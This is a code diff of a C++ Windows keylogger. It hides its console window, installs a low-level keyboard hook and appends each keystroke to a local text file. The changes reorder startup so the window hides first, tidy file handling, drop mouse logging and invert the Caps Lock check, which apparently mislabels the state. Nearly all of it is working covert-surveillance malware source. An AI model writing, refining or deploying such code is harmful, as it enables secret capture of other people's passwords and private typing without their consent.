@@ -1,18 +1,17 @@
 #define PATH "..\\KeyLogger_OUTFILE.txt"  // path to output file location
-#define VIRTUAL_KEY_CODE key->vkCode
 #include <iostream>
 #include <Windows.h>
 #include <fstream>
 HHOOK keyboardHook;
 void hide();
 void show();
-void saveToFile(DWORD key);
+bool saveToFile(DWORD key);
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
 
 int main()
 {
-	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, NULL);
 	hide();
+	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, NULL);
 	MSG Msg;
 	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
 	{
@@ -21,18 +20,16 @@ int main()
 	}
 }
 
-void saveToFile(DWORD key)
+bool saveToFile(DWORD key)
 {
-	FILE* OUTPUT_FILE;
-	OUTPUT_FILE = fopen(PATH, "a+");
+	FILE* OUTPUT_FILE = fopen(PATH, "a+");
 	if (OUTPUT_FILE == NULL)
-	{
-		exit(0);
-	}
+		return false;
 	else if (key == VK_ESCAPE)
 	{
-		exit(1);
 		UnhookWindowsHookEx(keyboardHook);
+		fclose(OUTPUT_FILE);
+		exit(1);
 	}
 	else if (key == VK_TAB)
 		fprintf(OUTPUT_FILE, "%s", "[TAB]");
@@ -54,18 +51,15 @@ void saveToFile(DWORD key)
 		fprintf(OUTPUT_FILE, "%s", "[RIGHT SHIFT]");
 	else if (key == VK_CAPITAL)
 	{
-		if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
+		if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0)
 			fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK ON]");
 		else
 			fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK OFF]");
 	}
-	else if (key == VK_LBUTTON)
-		fprintf(OUTPUT_FILE, "%s", "[LEFT MOUSE BUTTON]");
-	else if (key == VK_RBUTTON)
-		fprintf(OUTPUT_FILE, "%s", "[RIGHT MOUSE BUTTON]");
 	else
 		fprintf(OUTPUT_FILE, "%s", &key);
 	fclose(OUTPUT_FILE);
+	return true;
 }
 
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -74,18 +68,18 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 	if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
 	{
 		if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0)
-			VIRTUAL_KEY_CODE = char(tolower(VIRTUAL_KEY_CODE));
-		saveToFile(VIRTUAL_KEY_CODE);
+			key->vkCode = char(tolower(key->vkCode));
+		saveToFile(key->vkCode);
 				
 	}
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
-void hide()
+static void hide()
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 }
 
-void show()
+static void show()
 {
 	ShowWindow(GetConsoleWindow(), SW_SHOW);
 }
